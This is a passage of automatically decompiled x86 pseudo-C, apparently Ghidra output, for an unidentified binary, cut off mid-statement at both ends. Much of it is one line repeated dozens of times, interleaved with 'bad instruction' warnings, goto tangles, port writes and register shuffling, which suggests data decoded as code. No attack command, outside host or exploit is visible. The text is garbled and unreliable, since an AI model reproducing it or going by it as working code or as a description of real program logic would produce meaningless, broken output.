*ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                *ppuVar12 = *ppuVar12 + uVar132;\n                bVar131 = CARRY1(*ppuVar12, uVar132);\n                *ppuVar12 = *ppuVar12 + uVar132;\n                ppuVar24 = iVar23 + -1;\n                Var3 = *0x10;\n                ppuVar25 = ppuVar24;\n                ppuVar44 = ppuVar43;\n                ppuVar117 = &stack0xfffffffc;\n                ppuStack44 = ppuVar116;\n                ppuVar14 = unaff_ESI;\n                if (ppuVar24 != NULL && *ppuVar12 != '\\0') goto code_r0x00441461;\n                goto code_r0x00441402;\n            case 0x2:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x3:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x4:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x5:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x6:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            ppuStack20 = &fcn.004056c0::var_4h;\n            var_4h = 0x40;\n            ppuStack32 = ppuVar116[-6] + unaff_EDI[0x51];\n            ppuStack24 = 0x40;\n            ppuStack28 = ppuVar116[-7];\n            uStack36 = 0x40573b;\n            iVar23 = (**0x440028)();\n            if (iVar23 == 0) {\n                return 0x9;\n            }\n            param_2 = *(unaff_EDI + 0x46);\n            ppuVar43 = ppuVar43 + 1;\n            ppuVar116 = ppuVar116 + 10;\n            iVar23 = extraout_ECX;\n            in_ST0 = extraout_ST0;\n            in_ST1 = extraout_ST1;\n        } while (ppuVar43 < param_2);\n    }\n    return NULL;\ncode_r0x00441402:\n    if (!bVar131 && *0x10 != 0x90) {\n        *ppuVar12 = *ppuVar12 + ppuVar12;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    do {\n        puVar16 = ppuVar116[0x18];\n        in_ST6 = CONCAT64(CONCAT55(CONCAT41(CONCAT37(CONCAT21(CONCAT19(puVar16 >> 0x18, \n                                                                       CONCAT18(in_ST6 >> 0x28, SUB108(in_ST6, 0))) >>\n                                                              0x40, puVar16 >> 0x10), \n                                                     (SUB107(in_ST6, 0) >> 0x20) << 0x30) >> 0x30, puVar16 >> 8), \n                                   (SUB105(in_ST6, 0) >> 0x18) << 0x20) >> 0x20, \n                          SUB104(in_ST6, 0) & 0xffffff | puVar16 << 0x18);\n        while( true ) {\n            ppuVar44 = ppuVar12;\n            uVar132 = 0x9f < ppuVar44;\n            uVar6 = ppuVar44 + 0x60;\n            uVar122 = ppuVar44 & 0xffffff00;\n            ppuVar12 = uVar122 | uVar6;\n            bVar131 = uVar6 == 0;\n            ppuVar117 = ppuVar116;\n            if (uVar132 || bVar131) goto code_r0x0044147d;\n            uVar38 = ppuVar43 & 0xffffff00;\n            ppuVar43 = uVar38 | *(unaff_EDI + 0x76);\n            ppuVar25 = ppuVar12;\n            ppuVar13 = ppuVar24;\n            ppuStack148 = ppuVar12;\n            if (!uVar132 || bVar131) goto code_r0x004413f5;\n            uStack133._1_3_ = Var3 + -0x70;\n            *ppuVar12 = *ppuVar12 << 6 | *ppuVar12 >> 2;\n            uVar7 = *ppuVar116;\n            uVar132 = uVar7 < 0x60;\n            *ppuVar116 = *ppuVar116 + -0x60;\n            cVar49 = *ppuVar116;\n            if (uVar7 < 0x60) break;\n            uStack117._1_3_ = SUB43(ppuVar12, 0);\n            Var4 = uStack117._1_3_;\n            uStack113 = uStack113 & 0xffffff00 | ppuVar44 >> 0x18;\n            uStack121._1_3_ = SUB43(ppuVar24, 0);\n            uStack117._0_1_ = ppuVar24 >> 0x18;\n            uStack125._1_3_ = param_2;\n            uStack121._0_1_ = param_2 >> 0x18;\n            uStack129._1_3_ = SUB43(ppuVar43, 0);\n            uStack125._0_1_ = uVar38 >> 0x18;\n            uStack129._0_1_ = &stack0xffffff90 >> 0x18;\n            uStack136 = SUB42(ppuVar113, 0);\n            uStack134 = ppuVar113 >> 0x10;\n            uStack133._0_1_ = ppuVar113 >> 0x18;\n            uStack144 = SUB42(ppuVar12, 0);\n            uStack142 = uVar122 >> 0x10;\n            uStack141 = uStack141 & 0xffffff00 | ppuVar44 >> 0x18;\n            ppuStack80 = ppuVar116;\n            unaff_EDI = ppuVar12;\n            if (uVar7 < 0x60) {\n                out(0x5f, ppuVar12);\n                goto code_r0x00441487;\n            }\n            fVar136 = in_ST0;\n            if (-1 < *ppuVar116) {\n                ppuVar116 = ppuVar12 + -8;\n                puVar16 = *ppuVar116;\n                *ppuVar116 = *ppuVar116 << 0x1b;\n                uVar132 = puVar16 << 0x1a < 0;\n                bVar131 = *ppuVar116 == NULL;\n                ppuVar117 = 0xbffef077;\n                fVar135 = in_ST1;\n                fVar137 = in_ST2;\n                fVar142 = in_ST3;\n                fVar138 = in_ST4;\n                fVar139 = in_ST5;\n                if (!uVar132 && !bVar131) goto code_r0x00441501;\ncode_r0x004414a1:\n                out(0xbf, ppuVar12);\n                if (!uVar132 && !bVar131) goto code_r0x004414f5;\n                return ppuVar12;\n            }\n            if (0x5f < uVar7) {\n                uVar38 = ppuVar44 & 0xffff00 | uVar6;\n                unaff_ESI = uVar38 | ppuVar44 & 0xff000000;\n                if (uVar7 < 0x60) {\n                    ppuStack164 = &stack0xffffff70;\n                    ppuStack176 = unaff_ESI;\n                    ppuStack172 = ppuVar116;\n                    ppuStack168 = ppuVar113;\n                    ppuStack160 = ppuVar43;\n                    ppuStack156 = param_2;\n                    ppuStack152 = ppuVar12;\n                    ppuStack148 = ppuVar24;\n                    uStack144 = ppuStack44._0_2_;\n                    goto code_r0x00441469;\n                }\n                goto code_r0x0044143d;\n            }\n        }\n        unaff_EDI = CONCAT13(uStack109, uStack113._1_3_);\n    } while( true );\ncode_r0x0044143d:\n    ppuStack100 = &stack0xffffffb0;\n    ppuVar13 = ppuVar24;\n    ppuVar116 = ppuStack80 + -1;\n    bVar131 = ppuVar116 == NULL;\n    cStack104 = ppuVar113;\n    cStack103 = ppuVar113 >> 8;\n    uStack108 = ppuVar116;\n    uStack107 = ppuVar116 >> 8;\n    uStack105 = ppuVar116 >> 0x18;\n    uStack133._1_3_ = Var3 + -0x70;\n    uStack113 = uStack113 & 0xff | uVar38 << 8;\n    uStack109 = (ppuVar44 & 0xff000000) >> 0x18;\n    fVar137 = in_ST1;\n    uStack102 = uStack134;\n    uStack101 = uStack133;\n    ppuStack96 = ppuVar43;\n    ppuStack92 = param_2;\n    ppuStack88 = ppuVar12;\n    ppuStack84 = ppuVar13;\n    if (uVar132 || bVar131) goto code_r0x004414b1;\n    cVar49 = ppuVar13;\n    ppuVar24 = ppuVar13 & 0xffff0000 | CONCAT11(ppuVar13 >> 8 ^ *(ppuVar13 + 0x76), cVar49);\n    uVar132 = false;\n    *param_2 = *param_2 & param_2 >> 8;\n    bVar131 = *param_2 == '\\0';\n    uStack117._1_3_ = SUB43(ppuVar24, 0);\n    uStack113 = uVar38 << 8 | ppuVar13 >> 0x18;\n    uStack117._0_1_ = uVar122 >> 0x18;\n    uStack121 = CONCAT31(Var4, uStack121);\n    uStack129._0_1_ = &stack0xffffff90 >> 0x18;\n    uStack144 = uVar38;\n    uStack142 = (ppuVar44 & 0xffff00) >> 0x10;\n    uStack141 = uStack141 & 0xffffff00 | ppuVar44 >> 0x18;\n    ppuStack80 = ppuVar116;\n    if (!bVar131) goto code_r0x00441449;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    *ppuVar24 = *ppuVar24 + cVar49;\n    ppuStack100 = &stack0xffffffb0;\ncode_r0x004413f1:\n    *ppuVar24 = *ppuVar24 + ppuVar24;\n    *ppuVar24 = *ppuVar24 + ppuVar24;\n    ppuVar25 = ppuVar24;\n    ppuVar13 = ppuVar12;\ncode_r0x004413f5:\n    *ppuVar25 = *ppuVar25 + ppuVar25;\n    *ppuVar25 = *ppuVar25 + ppuVar25;\n    goto code_r0x004413f9;\ncode_r0x00441449:\n    ppuStack100 = &stack0xffffffb0;\n    if (!bVar131) goto code_r0x0044144d;\n    goto code_r0x0044143d;\ncode_r0x0044144d:\n    unaff_ESI = ppuVar14;\n    ppuStack44 = uVar144;\n    ppuVar12 = ppuStack20;\n    ppuVar25 = ppuStack24;\n    param_2 = ppuStack28;\n    ppuVar44 = ppuStack32;\n    ppuVar117 = ppuStack40;\n    unaff_EDI = ppuStack48;\n    if (!uVar132 && !bVar131) {\n        return ppuStack20;\n    }\ncode_r0x00441461:\n    while( true ) {\n        ppuVar116 = unaff_EBX;\n        ppuVar43 = unaff_retaddr;\n        ppuVar113 = ppuVar117;\n        puVar26 = ppuVar12 + 0x76;\n        uVar132 = false;\n        *puVar26 = *puVar26 ^ &stack0xfffffff0;\n        bVar131 = *puVar26 == 0;\n        ppuVar25 = ppuVar25 + -1;\n        ppuVar117 = ppuStack44;\n        unaff_retaddr = ppuVar43;\n        ppuVar14 = unaff_ESI;\n        if (ppuVar25 != NULL && !bVar131) goto code_r0x004414bf;\n        ppuVar24 = param_5;\n        ppuVar25 = param_5;\n        ppuVar12 = param_4;\n        ppuVar13 = param_4;\n        param_2 = param_3;\n        ppuVar113 = var_4h;\n        unaff_EBX = ppuVar116;\n        if (bVar131) break;\ncode_r0x00441469:\n        bVar131 = *(ppuVar24 + 0x76) < &stack0xffffff70;\n        puVar114 = *(ppuVar24 + 0x76);\n        *ppuVar116 = *ppuVar116;\n        if (bVar131 || puVar114 == &stack0xffffff70) goto code_r0x004413f1;\n        *(ppuVar24 + 0x76) = (*(ppuVar24 + 0x76) - (ppuVar24 >> 8)) - bVar131;\n        uVar132 = false;\n        *unaff_ESI = *unaff_ESI ^ ppuVar43 >> 8;\n        bVar131 = *unaff_ESI == '\\0';\n        unaff_EDI = CONCAT13(uStack141, CONCAT12(uStack142, uStack144));\n        ppuVar117 = CONCAT13(uStack137, uStack141._1_3_);\n        ppuVar113 = CONCAT13(uStack133, CONCAT12(uStack134, uStack136));\n        ppuVar43 = CONCAT13(uStack125, uStack129._1_3_);\n        param_2 = CONCAT13(uStack121, uStack125._1_3_);\n        ppuVar24 = CONCAT13(uStack117, uStack121._1_3_);\n        ppuVar12 = CONCAT13(uStack113, uStack117._1_3_);\n        if (bVar131) goto code_r0x00441489;\n        uVar132 = false;\n        bVar131 = (*(unaff_EDI + 0x76) & uStack129 >> 8) == 0;\n        uStack129 = uStack129 & 0xffffff00 | &stack0xffffff50 >> 0x18;\n        uStack133 = uStack133 & 0xff | &stack0xffffff50 * 0x100;\ncode_r0x0044147d:\n        out(0x5f, ppuVar12);\n        fVar136 = in_ST0;\n        fVar135 = in_ST1;\n        unaff_ESI = unaff_EBX;\n        if (uVar132 || bVar131) goto code_r0x004414a1;\ncode_r0x00441481:\n        in_AF = 9 < (ppuVar12 & 0xf) | in_AF;\n        uVar6 = ppuVar12 + in_AF * '\\x06';\n        ppuVar12 = ppuVar12 & 0xffffff00 | uVar6 + (0x90 < (uVar6 & 0xf0) | uVar132 | in_AF * (0xf9 < uVar6)) * '`';\n        ppuVar116 = unaff_EDI + -8;\n        cVar49 = *ppuVar116;\n        *ppuVar116 = *ppuVar116 << 7;\n        uVar132 = cVar49 << 6 < '\\0';\n        cVar49 = *ppuVar116;\n        unaff_EDI = ppuVar14;\n        unaff_EBX = unaff_ESI;\ncode_r0x00441487:\n        bVar131 = cVar49 == '\\0';\n        ppuVar25 = ppuVar24;\n        fVar136 = in_ST0;\n        if (uVar132 || bVar131) goto code_r0x004414e9;\ncode_r0x00441489:\n        pcStack180 = str._v_._v0;\n        uVar143 = func_0xe0348aed();\n        uStack52 = uVar144 >> 0x20;\n        ppuStack44 = uVar144;\n        ppuVar25 = extraout_ECX_00;\n        ppuVar116 = ppuVar117;\n        unaff_EDI = ppuStack76;\n        in_ST0 = extraout_ST0_00;\n        fVar135 = extraout_ST0_00;\n        in_ST1 = extraout_ST1_00;\n        puVar114 = appuStack296[2];\n        puVar126 = appuStack260[1];\n        ppuVar24 = appuStack228[1];\n        unaff_ESI = unaff_EBX;\n        if (uVar132 || bVar131) goto code_r0x004414d1;\n        do {\n            appuStack228[1] = ppuVar24;\n            appuStack260[1] = puVar126;\n            appuStack296[2] = puVar114;\n            ppuVar117 = ppuVar116;\n            ppuVar116 = ppuStack92;\n            if (!uVar132 && !bVar131) {\n                return uVar143;\n            }\ncode_r0x004414c5:\n            ppuStack92 = ppuVar116;\n            uVar144 = CONCAT44(uStack52, unaff_ESI);\n            ppuVar14 = uVar143;\n            if (uVar132 || bVar131) {\n                return ppuVar14;\n            }\n            unaff_EBX = unaff_ESI & 0xffff0000 | in_DS;\n            ppuStack20 = ppuVar25;\n            ppuStack24 = uVar143 >> 0x20;\n            ppuStack28 = ppuVar43;\n            ppuStack32 = &stack0xfffffff4;\n            ppuStack40 = ppuVar117;\n            uStack36 = ppuVar113;\n            if (uVar132 || bVar131) goto code_r0x0044144d;\n            ppuStack44._0_2_ = SUB42(unaff_ESI, 0);\n            ppuVar116 = ppuVar117;\n            unaff_EDI = unaff_ESI;\n            fVar135 = in_ST0;\n            ppuStack72 = unaff_ESI;\n            ppuStack68 = ppuVar117;\n            ppuStack64 = ppuVar113;\n            puStack60 = &stack0xffffffd8;\n            puVar114 = &stack0xffffffd8;\n            ppuStack56 = ppuVar43;\n            ppuStack48 = ppuVar25;\n            uVar144 = uVar143;\n            if (uVar132 || bVar131) goto code_r0x00441521;\ncode_r0x004414d1:\n            ppuStack84 = uVar143 >> 0x20;\n            ppuStack92 = &stack0xffffffb8;\n            uVar122 = uVar132;\n            uVar38 = uVar143 + 0xe707660;\n            uVar132 = 0xf18f899f < uVar143 || CARRY4(uVar38, uVar122);\n            ppuStack76 = uVar38 + uVar122;\n            bVar131 = ppuStack76 == NULL;\n            uStack125._1_3_ = Var3 + -0xb0;\n            ppuVar116 = ppuStack76;\n            param_2 = ppuStack84;\n            fVar137 = in_ST2;\n            fVar138 = in_ST3;\n            fVar139 = in_ST4;\n            fVar140 = in_ST5;\n            fVar142 = in_ST6;\n            ppuStack176 = unaff_EDI;\n            ppuStack100 = ppuVar117;\n            ppuStack96 = ppuVar113;\n            ppuStack88 = ppuVar43;\n            ppuStack80 = ppuVar25;\n            if (uVar132 || bVar131) goto code_r0x00441509;\n            uVar122 = uVar132;\n            bVar133 = CARRY4(ppuStack76 + 0x2dc1d98, uVar122);\n            uVar132 = 0xf48f899f < ppuStack76 || bVar133;\n            ppuVar12 = ppuStack76 + 0x2dc1d98 + uVar122;\n            bVar131 = ppuVar12 == NULL;\n            uStack108 = ppuVar12;\n            uStack107 = ppuVar12 >> 8;\n            uStack105 = ppuVar12 >> 0x18;\n            uStack113._1_3_ = SUB43(ppuVar25, 0);\n            uStack109 = ppuVar25 >> 0x18;\n            uStack117._1_3_ = uVar143 >> 0x20;\n            uStack113._0_1_ = uVar143 >> 0x38;\n            uStack121._1_3_ = SUB43(ppuVar43, 0);\n            uStack117._0_1_ = ppuVar43 >> 0x18;\n            uStack121._0_1_ = &stack0xffffff50 >> 0x18;\n            uStack129._1_3_ = SUB43(ppuVar113, 0);\n            uStack125._0_1_ = ppuVar113 >> 0x18;\n            uStack133 = uStack133 & 0xff | ppuVar117 << 8;\n            uStack129._0_1_ = ppuVar117 >> 0x18;\n            fVar136 = fVar135;\n            ppuStack208 = unaff_EDI;\n            ppuVar116 = &stack0xffffffb8;\n            if (uVar132 || bVar131) goto code_r0x004414f1;\n            param_2 = ppuVar12 >> 0x1f;\n            ppuStack92 = &stack0xffffffb8;\n            if (uVar132 || bVar131) {\n                ppuStack156 = &stack0xffffff78;\n                uStack141._1_3_ = SUB43(ppuVar12, 0);\n                uStack144 = SUB42(ppuVar25, 0);\n                uStack142 = ppuVar25 >> 0x10;\n                uStack141 = CONCAT31(uStack141._1_3_, uStack109);\n                fVar137 = in_ST1;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                fVar142 = in_ST3;\n                fVar138 = in_ST4;\n                fVar139 = in_ST5;\n                ppuStack164 = ppuVar117;\n                ppuStack160 = ppuVar113;\n                ppuVar24 = &stack0xffffff78;\n                ppuStack152 = ppuVar43;\n                ppuStack148 = param_2;\n                uStack137 = uStack105;\n                uStack136 = ppuStack44._0_2_;\n                ppuStack92 = &stack0xffffffb8;\n                ppuStack72 = unaff_EDI;\n                if ((0xf48f899f >= ppuStack76 && !bVar133) && !bVar131) goto code_r0x00441529;\ncode_r0x004414b9:\n                in_ST5 = in_ST6;\n                in_ST4 = fVar139;\n                in_ST3 = fVar138;\n                in_ST2 = fVar142;\n                uStack125._1_3_ = Var3 + -0x68;\n                in_ST6 = CONCAT28(in_MM7_Wd, CONCAT26(in_MM7_Wc, CONCAT24(in_MM7_Wb, in_ST7)));\n                *(unaff_EDI + 0x76) = ROUND(fVar135);\n                uStack108 = 5;\n                uStack107 = ppuVar12 >> 8;\n                uStack105 = ppuVar12 >> 0x18;\n                uStack113._1_3_ = SUB43(ppuVar25, 0);\n                uStack109 = ppuVar25 >> 0x18;\n                uStack117._1_3_ = SUB43(param_2, 0);\n                uStack113._0_1_ = param_2 >> 0x18;\n                uStack121._1_3_ = SUB43(ppuVar43, 0);\n                uStack117._0_1_ = ppuVar43 >> 0x18;\n                uStack121._0_1_ = &stack0xffffff98 >> 0x18;\n                uStack129._1_3_ = SUB43(ppuVar113, 0);\n                uStack125._0_1_ = ppuVar113 >> 0x18;\n                uStack133 = uStack133 & 0xff | ppuVar117 << 8;\n                uStack129._0_1_ = ppuVar117 >> 0x18;\n                ppuVar12 = CONCAT31(ppuVar12 >> 8, 5);\n                ppuVar44 = ppuVar43;\n                ppuVar14 = unaff_EDI;\n                ppuVar116 = unaff_EBX;\ncode_r0x004414bf:\n                unaff_ESI = ppuVar116;\n                ppuVar43 = ppuVar44;\n                uStack52 = uVar144 >> 0x20;\n                ppuVar24 = ppuVar25;\n                if (uVar132 || bVar131) goto code_r0x00441481;\n                uVar132 = 0xc6f899f < ppuVar12;\n                uVar143 = CONCAT44(param_2, ppuVar12 + -0x31be268);\n                bVar131 = ppuVar12 + -0x31be268 == NULL;\n                ppuVar116 = ppuStack92;\n                goto code_r0x004414c5;\n            }\n            while( true ) {\n                ppuVar116 = pcStack180;\n                ppuVar12 = pcStack180;\n                ppuVar25 = ppuStack184;\n                param_2 = ppuStack188;\n                ppuVar43 = ppuStack192;\n                ppuVar113 = ppuStack200;\n                ppuVar117 = ppuStack204;\n                unaff_EDI = ppuStack208;\n                fVar136 = fVar135;\n                fVar137 = in_ST2;\n                fVar138 = in_ST3;\n                fVar139 = in_ST4;\n                fVar140 = in_ST5;\n                fVar142 = 